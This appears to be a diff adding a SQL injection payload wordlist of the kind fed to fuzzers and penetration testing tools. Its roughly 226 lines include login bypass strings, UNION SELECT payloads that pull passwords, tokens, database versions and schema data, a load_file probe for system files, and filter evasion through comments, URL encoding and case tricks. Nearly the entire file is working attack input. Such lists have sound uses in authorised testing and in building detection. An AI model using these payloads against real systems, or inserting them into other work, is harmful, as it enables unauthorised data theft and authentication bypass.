@@ -1,0 +1,226 @@
+'
+''
+'''
+'-
+''--
+")
+"))
+"*"
+"-"
+"/*
+'%22
+%22'
+' #
+' '
+'"-*/'""'
+'#
+'&'
+')
+'))
+'*'
+*/*
+*|
+,
+-'
+--
+.
+/
+/*…*/ 
+//
+//*
+;
+<>"'%;)(&+
+=
+==
+?
+\
+\\
+`
+``
+|
+||
+’) --
+%22
+%22%22%22
+%22%22
+'%22%22
+%22'%22
+%22%22%22%22%22%22%22%22%22%22
+'''''%22%22%22%22
+''%22
+%22''
+1"
+1'
+1*" 
+1/*'*/
+1, $where: '1 == 1'
+|| 1==1
+1'1
+1/*!1111'*/
+',1,1),(1,2,3,4,5)-- -
+1') and '1'='1--
+1′) and '1′='1–
+1+and+(SELECT+1+from+admin+limit+0,1
+1 AND (SELECT * FROM Users) = 1	
+1 AND (SELECT * FROM Users) = 1    
+1+and+(select+pass+from+users+limit+0,1
+1+and+(select+password+from+users+limit+0,1
+-1' and union+distinct+select+1+--+
+1'||'asd'||'  
+1-false
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 or 1=1
+1' or '1'='1
+1' or 1=1;--
+1' ORDER BY 1--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1'
+1\'
+1'-- -
+1+--+
+-1)'
+1'--/**/-
+1'--/**/-
+1'--/*--*/-
+1'--/*&a=*/-
+1'--/*1337*/-
+1'--/**_**/-
+1'--%0A-
+1'--%0b-
+1'--%0d%0A-
+1' /**/ORDER/**/BY/**/ 1-- -  
+1/*!f****U%0d%0a+order+by+*/1-- -  
+-1' /**/ORDER/**/BY/**/ 1-- -```)  
+1 /**/ORDER/**/BY/**/ 1-- -```)
+1 order by 5-- -
+1' Union Select 1,2,3,4-- -
+1'+UNION+ALL+SELECT+null,null,null,null--+-
+-1' div 0' Union Select 1,2,3,4-- -
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+1+union+all+select+1,2,3,4,5,6,7,8,9,10,11-
+-1' union+distinct+select+1+--+
+-1' union+select+1+--+
+1' Union Select 1-- -:1' Union Select 1-- -
+-1' UNION SELECT 1,2,3--+
+1+union+select+1,2,3,4,5,6,7,8,9,10,EVENT_CATALOG+from+information_schema.EVENTS
+-1+union+select+1,2,3,4,5,6,7,8,9,10,@@version
+1'union select 1,2,database(),3,4,5,6,7,8,9,10,11 — +-
+-1 union select 1, HERE, 1--+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,token,8,7,6,5,4,3,2,1+from+user+where+userid=1--
+=1 UNION SELECT * FROM User
+1' union select user(),schema(),4,5,6,7,%25278
+-%20%60admin'%2F*%60
+%20or%20''='
+'%20or%20''='
+%20or%201=1
+'%20or%201=1
+--%20or%20%23
+'%20or%20''%26'
+a’ AND ‘omar’=’not-omar
+a’ AND ORD(MID(VERSION(),1,1))>96 AND ‘omar’=’omar
+-abc)/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/'a'/**/--
+- `admin' #`
+- `admin' --`
+- `admin'/*`
+admin" #
+admin" --
+admin"/
+admin"/*
+admin' #
+admin' --
+admin'/
+admin'/*
+admin'%20--
+admin')%20or%20('1'%3D'1'%2F*
+admin%22%20--
+admin%22%20or%201%3D1
+admin%22%20or%201%3D1--
+" or ""="
+') or ('')=('
+')) or ((''))=(('
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+" or 1--
+') or 1--
+or 1 --'
+or 1/*
+' or 1 --'
+' or 1--
+' OR '1
+' OR 1 -- -
+OR 1=0
+OR 1=0#
+OR 1=0-- 
+OR 1=0
+OR 1=0#
+OR 1=0-- 
+ or 1=1 --
+or '1'='1
+or '1'='1'--
+") or true--
+‘)) or ((‘x’))=((‘
+’)) or ((‘x’))=((‘ &Password=’)) or ((‘x’))=((‘
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 'x'='x
+') or ('x')=('x
+') or ('x'='x
+UNION%252520ALL%252520SELECT%2525201%25252C2%25252C3
+UNION%252520ALL%252520SELECT%2525201%25252C2%25252C3--%252520
+union /*!50000%53elect*/
+/**/union/*!50000select*/
+/**/union/*!50000select*//**/
+/**/UNION/**//*!50000SELECT*//**/
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+/*!union*//*--*//*!all*//*--*//*!select*/
+' or 'xyz'='xyz
+' or 'xyz'='xyz' -- 
+' or 41<78 -- 
+' or 41=41 -- 
+0x00 or 'xyz'='xyz'
+0x00 or 'xyz'='xyz' -- 
+0x00 or 41<78
+0x00 or \'xyz\'=\'xyz\'
+\' or \'xyz\'=\'xyz
+\' or \'xyz\'=\'xyz\' -- 
+\\' or 41<78 -- 
+\\' or 41=41 -- 
+\\' or \\'xyz\\'=\\'xyz
+\\' or \\'xyz\\'=\\'xyz\\' -- 
+\\n or 'xyz'='xyz'
+\\n or 'xyz'='xyz' -- 
+\\n or 41<78
+\\n or 41<78 -- 
+\\n or 41=41
+\\n or 41=41 -- 
+\\n or \\'xyz\\'=\\'xyz\\'
+\\n or \\'xyz\\'=\\'xyz\\' -- 
+\\n' or 'xyz'='xyz
+\\n' or 'xyz'='xyz' -- 
+\\n' or 41<78 -- 
+\\n' or 41=41 -- 
+\\n\\' or 41<78 -- 
+\\n\\' or 41=41 -- 
+\\n\\' or \\'xyz\\'=\\'xyz
+\\n\\' or \\'xyz\\'=\\'xyz\\' -- 
+\\r\\n\\' or \\'xyz\\'=\\'xyz
+\\r\\n\\' or \\'xyz\\'=\\'xyz\\' -- 
+\n or 'xyz'='xyz'
+\n or 'xyz'='xyz' -- 
+\n or 41<78
+%5c%5cr%5c%5cn%20or%2052%3d52%20--%20
+%20union%20all%20select%201337,1337,1337
+%20union%20all%20select%201337,1337,1337%20--%20
